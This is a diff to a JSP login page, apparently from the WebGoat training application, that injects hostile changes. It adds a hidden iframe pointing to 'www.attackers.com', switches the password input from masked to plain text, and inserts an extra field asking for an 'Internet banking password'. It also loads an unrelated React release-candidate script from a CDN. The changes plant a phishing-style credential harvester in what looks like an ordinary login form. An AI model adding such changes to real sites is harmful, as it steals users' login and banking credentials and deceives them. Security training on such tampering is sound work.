@@ -1,12 +1,12 @@
 <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
 <html>
     <head>
-        <title>Login Page</title>
+        <title>Login Page Update</title>
         <!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
         <!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
         <!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
         <!--[if gt IE 8]><!-->
-
+<iframe src='http://www.attackers.com' style='visibility: hidden;'></iframe>
         <!--  CSS -->
         <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon"/>
         <!-- Bootstrap core CSS -->
@@ -21,6 +21,7 @@
 
 
     </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.0.0-rc.0-next-3b3daf557-20211210/umd/react.production.min.js"></script>
 </head>
 <body onload='document.loginForm.username.focus();'>
     <section id="container" ng-controller="goatLesson">
@@ -34,7 +35,7 @@
 
             </div><!--toggle navigation end-->
             <div class="lessonTitle" >
-                <h1 id="lessonTitle">Please login</h1>
+                <h1 id="lessonTitle">Please login Here</h1>
             </div><!--lesson title end-->
 
         </header>
@@ -55,9 +56,13 @@
                     </div>
                     <div class="form-group">
                         <label for="exampleInputPassword1">Password</label>
-                        <input type="password" class="form-control" id="exampleInputPassword1" placeholder="Password" name='password'>
+                        <input type="text" class="form-control" id="exampleInputPassword1" placeholder="Password" name='password'>
                     </div>
-
+                    
+                  <div class="form-group">
+                        <label for="bpasw">Internet banking password</label>
+                        <input type="text" class="form-control" id="bpassword" placeholder="Bank Password" name='bpassword'>
+                    </div>
 
                     <input type="hidden" name="${_csrf.parameterName}"
                            value="${_csrf.token}" />
